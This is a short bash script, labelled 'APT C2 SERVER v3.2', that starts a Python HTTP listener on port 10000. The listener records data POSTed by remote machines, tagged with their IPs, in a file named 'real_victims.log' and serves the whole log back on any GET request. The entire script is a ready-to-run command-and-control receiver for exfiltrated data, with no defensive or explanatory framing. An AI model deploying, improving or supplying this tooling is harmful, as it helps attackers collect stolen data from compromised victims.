#!/bin/bash
echo "╔══════════════════════════════════════╗"
echo "║     💀 APT C2 SERVER v3.2           ║"
echo "║     HTTP Handler + Unlimited Logs   ║"
echo "╚══════════════════════════════════════╝"

mkdir -p ~/c2_server/logs
LOG_FILE=~/c2_server/logs/real_victims.log

python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler

LOG = '$LOG_FILE'

class C2Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        data = self.rfile.read(length).decode('utf-8', errors='ignore')
        ip = self.client_address[0]
        print(f'[+] {ip}: {data}')
        with open(LOG, 'a') as f:
            f.write(f'{ip}: {data}\n')
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(b'ACK')
    
    def do_GET(self):
        try:
            with open(LOG, 'r') as f:
                all_data = f.read()
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(all_data.encode() if all_data else b'C2 ACTIVE - No logs yet')
        except:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'C2 ACTIVE - No logs yet')

port = 10000
print(f'[+] Listening on port {port}')
HTTPServer(('0.0.0.0', port), C2Handler).serve_forever()
"
